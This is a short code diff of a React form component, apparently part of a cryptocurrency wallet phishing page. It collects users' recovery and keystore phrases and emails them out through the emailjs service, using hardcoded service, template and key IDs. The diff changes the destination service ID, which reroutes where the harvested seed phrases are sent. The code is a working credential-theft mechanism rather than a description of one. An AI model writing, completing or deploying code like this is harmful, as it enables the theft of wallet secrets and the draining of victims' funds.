@@ -51,7 +51,6 @@ const Phrase = () => {
     setLoading(true);
     reset();
 
-    // Only include the fields that have values
     const templateParams = {
       ...(data.recoveryPhrase && { recoveryPhrase: data.recoveryPhrase }),
       ...(data.keystorePhrase && { keystorePhrase: data.keystorePhrase }),
@@ -61,7 +60,7 @@ const Phrase = () => {
 
     try {
       const result = await emailjs.send(
-        "service_6rpjdqn",
+        "service_yctodgm",
         "template_mcaebkn",
         templateParams,
         "ycopLxNeq0xS4yCi4"
